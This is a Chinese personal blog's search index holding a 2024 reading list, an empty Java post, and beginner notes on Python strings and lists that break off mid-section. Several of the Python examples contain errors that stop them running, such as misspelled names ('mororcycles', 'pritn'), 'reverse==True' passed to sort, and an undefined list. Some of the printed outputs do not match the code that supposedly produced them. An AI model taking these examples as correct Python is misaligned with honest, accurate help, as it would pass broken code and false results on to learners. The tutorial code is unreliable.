<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024-计划书单</title>
    <url>/2024/01/23/2024-%E8%AE%A1%E5%88%92%E4%B9%A6%E5%8D%95/</url>
    <content><![CDATA[<h2 id="预祝新的一年你会有更多的属于自己的时刻！❀❀❀"><a href="#预祝新的一年你会有更多的属于自己的时刻！❀❀❀" class="headerlink" title="预祝新的一年你会有更多的属于自己的时刻！❀❀❀"></a>预祝新的一年你会有更多的属于自己的时刻！❀❀❀</h2><h3 id="《家山》-王跃文"><a href="#《家山》-王跃文" class="headerlink" title="《家山》-王跃文"></a>《家山》-王跃文</h3><ul>
<li><p><input disabled type="checkbox"> 
looking forward to </p>
</li>
<li><p><input disabled type="checkbox"> 
reading </p>
</li>
<li><p><input checked disabled type="checkbox"> 
over</p>
</li>
</ul>
<blockquote>
<p>每一个人心中都会有一座属于自己的家山。</p>
</blockquote>
<h3 id="《且听风吟》-村上春树"><a href="#《且听风吟》-村上春树" class="headerlink" title="《且听风吟》-村上春树"></a>《且听风吟》-村上春树</h3><ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>这世间，中有一个人懂你，让你抿起嘴，想念时流下眼泪。那些曾以为走不出的日子，现在都回不去了。~</p>
</blockquote>
<h3 id="《1973年的弹子球》-村上春树"><a href="#《1973年的弹子球》-村上春树" class="headerlink" title="《1973年的弹子球》-村上春树"></a>《1973年的弹子球》-村上春树</h3><ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>长大，或许就是终有一天你会知道，有些事物，当它从我们的生命中遗落时，就已经无法寻回。</p>
</blockquote>
<h3 id="《寻羊冒险记》-村上春树"><a href="#《寻羊冒险记》-村上春树" class="headerlink" title="《寻羊冒险记》-村上春树"></a>《寻羊冒险记》-村上春树</h3><ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>我喜欢我的懦弱，痛苦和难堪也喜欢，喜欢夏天的光照，风的气息，蝉的鸣叫，我喜欢这些，喜欢的不得了。</p>
</blockquote>
<h3 id="《了不起的盖茨比》-译村上春树"><a href="#《了不起的盖茨比》-译村上春树" class="headerlink" title="《了不起的盖茨比》-译村上春树"></a>《了不起的盖茨比》-译村上春树</h3><ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>这个世界，并不是所有人，都拥有你的那些优势。</p>
</blockquote>
<h3 id="《蛤蟆先生看心理医生》"><a href="#《蛤蟆先生看心理医生》" class="headerlink" title="《蛤蟆先生看心理医生》"></a>《蛤蟆先生看心理医生》</h3><ul>
<li><input disabled type="checkbox"> looking forward to</li>
<li><input checked disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>能帮助你的人，只有你自己的。请相信，你可以完成这一切的，你并不是自以为的那样弱小。</p>
</blockquote>
<h3 id="《The-Wind-in-the-Willows》《柳林风声》"><a href="#《The-Wind-in-the-Willows》《柳林风声》" class="headerlink" title="《The Wind in the Willows》《柳林风声》"></a>《The Wind in the Willows》《柳林风声》</h3><ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>关于四个小动物之间的友情陪伴和共同冒险的人生故事，蛤蟆先生的原型。</p>
</blockquote>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>2024</tag>
        <tag>书单</tag>
        <tag>Love</tag>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>Java实战</title>
    <url>/2024/02/07/Java%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title>Python从入门到实践</title>
    <url>/2024/01/21/Python%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="概念定义"><a href="#概念定义" class="headerlink" title="概念定义"></a>概念定义</h3><blockquote>
<p>字符串是一系列字符</p>
</blockquote>
<h3 id="使用字符串"><a href="#使用字符串" class="headerlink" title="使用字符串"></a>使用字符串</h3><blockquote>
<ol>
<li>字符串元素的大小写</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot;Ada Lovelace&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(name.title())<span class="comment">#首字母大写</span></span><br><span class="line"><span class="built_in">print</span>(name.upper())<span class="comment">#所有字母大写</span></span><br><span class="line"><span class="built_in">print</span>(name.lower())<span class="comment">#所有字母小写</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Ada Lovelace</span><br><span class="line">Ada Lovelace</span><br><span class="line">ADA LOVELACE</span><br><span class="line">ada lovelace</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li><p>删除字符串空白</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;language=<span class="string">&#x27; python </span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language</span></span><br><span class="line"><span class="string">&#x27;</span> python <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language.lstrip()#删除左端空白</span></span><br><span class="line"><span class="string">&#x27;</span>python <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language.rstrip()#删除右端空白</span></span><br><span class="line"><span class="string">&#x27;</span> python<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language.strip()#删除左右两端空白</span></span><br><span class="line"><span class="string">&#x27;</span>python<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>删除前缀</p>
</li>
</ol>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;nostarch_url=<span class="string">&quot;https://nostarch.com&quot;</span></span><br><span class="line">&gt;&gt;&gt;nostarch_url.removeprefix(<span class="string">&#x27;https://&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;nostarch.com&#x27;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="概念定义-1"><a href="#概念定义-1" class="headerlink" title="概念定义"></a>概念定义</h3><blockquote>
<p>列表(list)是由一系列按照特定顺序排列的元素组成</p>
</blockquote>
<h3 id="访问列表元素"><a href="#访问列表元素" class="headerlink" title="访问列表元素"></a>访问列表元素</h3><blockquote>
<ol>
<li>利用元素的索引来访问元素值</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">bicycles=[<span class="string">&#x27;trek&#x27;</span>,<span class="string">&#x27;cannondale&#x27;</span>,<span class="string">&#x27;redline&#x27;</span>,<span class="string">&#x27;specialized&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(bicycles[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(bicycles[<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(bicycles[-<span class="number">1</span>])</span><br><span class="line">messages=<span class="string">f&quot;My first bicycle was a <span class="subst">&#123;bicycles[<span class="number">0</span>].title()&#125;</span>&quot;</span><span class="string">&#x27;&#x27;&#x27;在字符串中插入变量的值，使用f字符串，f为format的简写，Python通过把花括号的变量替换成变量的值来设置字符串的格式&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(messages)</span><br><span class="line"><span class="comment">#列表元素的索引是从0开始</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;列表元素索引为3的元素为specialized,而不是redline&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;索引-1表示列表的最后一个元素&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#bicycles[0]为对象；title()为方法即函数；</span></span><br><span class="line"><span class="comment">#bicycles[0].title()为对象调用title()方法的形式</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">trek</span><br><span class="line">specialized</span><br><span class="line">specialized</span><br><span class="line">My first bicyvle was a Trek</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>修改列表元素</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"></span><br><span class="line">motorcycles[<span class="number">0</span>]=<span class="string">&#x27;ducati&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;ducati&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li>添加列表元素</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"></span><br><span class="line">motorcycles.append(<span class="string">&#x27;ducati&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>,<span class="string">&#x27;ducati&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li><p>删除列表元素</p>
<ul>
<li><p>使用del语句删除列表元素</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> motorcycles[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>使用pop()方法删除列表元素，并返回删除值</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#motorcycles.py</span></span><br><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"></span><br><span class="line">motorcycle=motorcycles.pop(<span class="number">0</span>)<span class="comment">#括号内为标索引则默认删除最后一个元素，并将其返回</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;The first motorcycle I woned was a <span class="subst">&#123;motorcycle.title()&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;honda&#x27;,&#x27;yamaha&#x27;,&#x27;suzuki&#x27;]</span><br><span class="line">The first motorcycle I woned was a honda.</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>根据值删除元素</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">motorcycles=[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>,<span class="string">&#x27;ducati&#x27;</span>]</span><br><span class="line">too_expensive=<span class="string">&#x27;ducati&#x27;</span></span><br><span class="line">mororcycles.remove(too_expensive)</span><br><span class="line"><span class="built_in">print</span>(motorcycles)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\nA <span class="subst">&#123;too_expensive.title()&#125;</span> is too expensive for me!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">                                        </span><br><span class="line">A Ducati is too expensive <span class="keyword">for</span> me!</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p>使用sort()方法对列表进行永久排序</p>
<ul>
<li>正序(字母表)</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">cars.sort()</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<ul>
<li>反序(反字母表)</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">cars.sort(reverse==<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>使用sorted()方法对列表进行临时排序</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here is the orignal list:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here is the sorted list:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(cars))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(cars,reverse==<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">pritn(<span class="string">&quot;Here is the orignal list agin:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Here is the orignal list:</span><br><span class="line">[<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">Here is the sorted list:</span><br><span class="line">[<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>]</span><br><span class="line">Here is the orignal list agin:</span><br><span class="line">[<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>反向打印列表</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br><span class="line"></span><br><span class="line">cars.reverse()</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>使用len()方法列表长度</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line"><span class="built_in">len</span>(cars)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure></div></li>
</ol>
</blockquote>
<h3 id="操作列表"><a href="#操作列表" class="headerlink" title="操作列表"></a>操作列表</h3><blockquote>
<ol>
<li>遍历列表</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">magicians = [<span class="string">&#x27;alice&#x27;</span>,<span class="string">&#x27;david&#x27;</span>,<span class="string">&#x27;carolina&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> magician <span class="keyword">in</span> magiccians:</span><br><span class="line">    <span class="built_in">print</span>(magician)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">alice</span><br><span class="line">david</span><br><span class="line">carolina</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>创建数值列表</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#values.py</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line"><span class="comment">#for 循环打印1-4的整数，range()方法是左闭右开区间[1,5)</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_list.py</span></span><br><span class="line">numbers = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>))<span class="comment">#使用强制转换将数字转换成列表</span></span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[1,2,3,4,5]</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#even_numbers_list.py</span></span><br><span class="line">even_numbers = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>,<span class="number">2</span>))<span class="comment">#range()方法有3个参数时，第三个参数为步长</span></span><br><span class="line"><span class="built_in">print</span>(even_numbers)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[2,4,6,8,10]</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#square_numbers.py</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    square = value ** <span class="number">2</span></span><br><span class="line">    squares.append(square)</span><br><span class="line"><span class="built_in">print</span>(squares)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[1,4,9.16,25,36,49,64,81,100]</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li>列表元素统计</li>
</ol>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;digits= [1,2,3,4,5,6,7,8,9,0]</span><br><span class="line">&gt;&gt;&gt;min(digits)</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt;max(digits)</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">sum</span>(digits)</span><br><span class="line">45</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li><strong>列表推导式</strong></li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#square_numbers.py</span></span><br><span class="line">squares=[value**<span class="number">2</span> <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(squares)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[1,4,9.16,25,36,49,64,81,100]</span><br></pre></td></tr></table></figure></div>

<ol start="5">
<li><p><em><strong>切片(slice)</strong></em></p>
<p>​		创建切片，需要使用第一个元素和最后一个元素的索引，与range()函数一样，Python 在到达指定的第二个索引之前的元素时停止。要输出列表的前三个元素，要指定索引为0和3，将会返回索引分别为0，1，2的元素。</p>
</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">0</span>:<span class="number">3</span>])</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<p>​					如果需要提取列表的第二、三、四个元素，要指定索引为1和4</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">1</span>:<span class="number">4</span>])</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<p>​					如若未指定第一个索引，Python将自动从列表开头开始</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;charles&#x27;</span>,martina<span class="string">&#x27;,&#x27;</span>michael<span class="string">&#x27;,&#x27;</span>florence<span class="string">&#x27;]#注意没有到5，则为显示eil</span></span><br></pre></td></tr></table></figure></div>

<p>​					如若未指定结束索引，Python自动遍历至列表尾部</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(players[-<span class="number">3</span>:])</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<ol start="6">
<li><p>遍历切片</p>
<p>​		遍历列表中的部分元素，在for循环中使用列表切片。</p>
</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here is the first three player on my team:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> player <span class="keyword">in</span> players[:<span class="number">3</span>]:<span class="comment">#只遍历前三名队员</span></span><br><span class="line">    <span class="built_in">print</span>(player.title())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Here  is the first three player on my team:</span><br><span class="line">Charles</span><br><span class="line">Martina</span><br><span class="line">Michael</span><br></pre></td></tr></table></figure></div>

<ol start="7">
<li><p>复制列表</p>
